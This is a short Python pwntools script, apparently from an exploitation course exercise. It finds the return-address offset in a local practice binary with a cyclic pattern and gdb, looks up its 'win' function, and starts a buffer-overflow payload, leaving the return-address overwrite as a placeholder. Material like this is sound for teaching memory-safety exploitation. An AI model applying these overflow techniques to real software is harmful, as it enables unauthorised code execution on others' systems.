#!/usr/bin/env python2
from pwn import *
# TODO: change to fit YOUR terminal
context.terminal = ['tmux', 'split-window', '-f', '-h']

def calculate_offset():
    io = process("./06_out_of_bounds_ret")
    gdb.attach(io, '''
                break *0x40120f
               ''')

    log.info('Skipping prompt')
    io.readuntil('input: ')

    log.info('Sending De Bruijn sequence')
    io.sendline(cyclic(100, n=8)) # 64bit address

    ## Wait, we don't get feedback!!!

    # get the corrupted return address from gdb
    # x/xg $rsp at the return address

    distance = cyclic_find(0x616161616161616c, n=8)
    log.info("The target is {} bytes into our overflow".format(distance))
    #io.interactive()
    return distance

def exploit(distance):
    io = process("./06_out_of_bounds_ret")

    payload = 'A' * distance
    # payload += '???'

    log.info('Skipping prompt')
    io.readuntil('input:')

    log.info('Sending payload')
    io.sendline(payload)

    io.interactive()

def get_addresses():
    # pwntools way of: readelf -s 05_out_of_bounds_fptr | grep 'win\|fail'
    e = ELF("./06_out_of_bounds_ret")
    win = e.symbols['win']
    fail = e.symbols['fail']

    log.info('Win: {}'.format(hex(win)))
    log.info('Fail: {}'.format(hex(fail)))


if __name__ == '__main__':
    get_addresses()
    offset = calculate_offset()
    exploit(offset)
